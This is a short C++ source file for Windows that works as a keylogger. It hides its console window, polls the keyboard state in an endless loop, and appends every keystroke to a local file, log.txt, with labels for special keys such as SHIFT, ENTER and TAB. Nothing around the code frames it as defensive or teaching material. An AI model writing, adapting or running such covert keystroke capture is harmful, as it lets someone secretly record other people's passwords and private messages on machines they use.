#pragma warning(disable:4996)

#include <iostream>
#include <Windows.h>

void saveFunc(int _key, const char* file);

int main(void) 
{
	FreeConsole();

	int i;
	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState((char)i) == -32767)
			{
				saveFunc(i, "log.txt");
				break;
			}
		}
	}
	return 0;
}

void saveFunc(int _key, const char* file)
{
	std::cout << _key << std::endl;
	Sleep(10);
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = std::fopen(file, "a+");

	switch (_key)
	{
	case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
		break;
	case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
		break;
	case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LButton]");
		break;
	case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RButton]");
		break;
	case VK_RETURN: fprintf(OUTPUT_FILE, "ENTER");
		break;
	case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
		break;
	case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
		break;
	case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
		break;
	case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
		break;
	case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
		break;
	case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
		break;
	}
	fprintf(OUTPUT_FILE, "%s", (char*)& _key);
	std::fclose(OUTPUT_FILE);
}
